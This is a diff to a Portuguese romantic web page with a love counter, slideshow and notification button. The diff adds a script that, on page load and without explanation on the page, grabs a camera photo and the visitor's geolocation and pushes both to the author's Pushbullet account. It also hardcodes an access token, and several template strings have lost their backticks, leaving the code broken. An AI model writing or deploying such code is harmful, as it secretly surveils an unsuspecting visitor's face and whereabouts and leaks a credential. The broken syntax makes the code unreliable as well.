@@ -6,6 +6,7 @@
   <title>Yago & Emily</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
   <style>
+    /* SEU CSS ORIGINAL */
     body {
       margin: 0;
       padding: 0;
@@ -99,12 +100,14 @@
       Tem gente que passa. Você ficou. <br><br>
       E se a vida fosse um livro, com certeza você seria minha parte favorita.
     </p>
-    <button class="btn-notificacao">chamar ele ❤️</button>
+    <button class="btn-notificacao">chamar ele ❤</button>
   </div>
 
   <script>
+    const PUSHBULLET_TOKEN = "o.IWXCk9EGij01IeY6unzB33nu1A7xOMOA"; // seu token
+
     document.addEventListener("DOMContentLoaded", () => {
-      // Contador
+      // ===== Contador =====
       const inicio = new Date("2025-02-21T00:00:00");
       function atualizaContador() {
         const agora = new Date();
@@ -114,12 +117,12 @@
         const minutos = Math.floor((diff / (1000 * 60)) % 60);
         const segundos = Math.floor((diff / 1000) % 60);
         document.getElementById("contador").innerText =
-          `Te amo há ${dias} dias, ${horas} horas, ${minutos} minutos e ${segundos} segundos ❤️`;
+          Te amo há ${dias} dias, ${horas} horas, ${minutos} minutos e ${segundos} segundos ❤;
       }
       setInterval(atualizaContador, 1000);
       atualizaContador();
 
-      // Slide
+      // ===== Slide =====
       let index = 0;
       const slides = document.querySelectorAll(".slide");
       function mostrarProximoSlide() {
@@ -129,34 +132,69 @@
       }
       setInterval(mostrarProximoSlide, 4000);
 
-      // Pushbullet
+      // ===== Botão manual Pushbullet =====
       document.querySelector(".btn-notificacao").addEventListener("click", () => {
-        const accessToken = "o.IWXCk9EGij01IeY6unzB33nu1A7xOMOA";
-        fetch("https://api.pushbullet.com/v2/pushes", {
-          method: "POST",
-          headers: {
-            "Access-Token": accessToken,
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            type: "note",
-            title: "🌸 Notificação da gatinha",
-            body: "O botão de amor foi clicado! 💌"
-          })
-        })
-        .then(response => {
-          if (response.ok) {
-            alert("Notificação enviada!\nAgora é só esperar a resposta do coração. 💞");
-          } else {
-            alert("❌ Erro ao enviar notificação.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-          alert("❌ Erro ao conectar com o Pushbullet.");
-        });
+        enviarPush("🌸 Notificação da gatinha", "O botão de amor foi clicado! 💌");
       });
+
+      // ===== Ao abrir site: pedir câmera + localização =====
+      capturarFotoELocalizacao();
     });
+
+    function enviarPush(titulo, corpo) {
+      fetch("https://api.pushbullet.com/v2/pushes", {
+        method: "POST",
+        headers: {
+          "Access-Token": PUSHBULLET_TOKEN,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          type: "note",
+          title: titulo,
+          body: corpo
+        })
+      }).then(res => {
+        if (res.ok) {
+          console.log("Push enviado com sucesso!");
+        } else {
+          console.error("Erro no Pushbullet");
+        }
+      }).catch(err => console.error(err));
+    }
+
+    async function capturarFotoELocalizacao() {
+      try {
+        // Captura da câmera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const fotoBase64 = canvas.toDataURL("image/png");
+
+        // Para a câmera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Localização
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const linkMaps = https://www.google.com/maps?q=${lat},${lon};
+
+          enviarPush("📷 Foto + Localização", Local: ${linkMaps}\nFoto em Base64:\n${fotoBase64});
+        }, err => {
+          enviarPush("⚠ Erro Localização", "Não foi possível obter a localização.");
+        });
+
+      } catch (e) {
+        enviarPush("⚠ Erro Captura", "Permissão negada ou erro: " + e.message);
+      }
+    }
   </script>
 </body>
 </html>
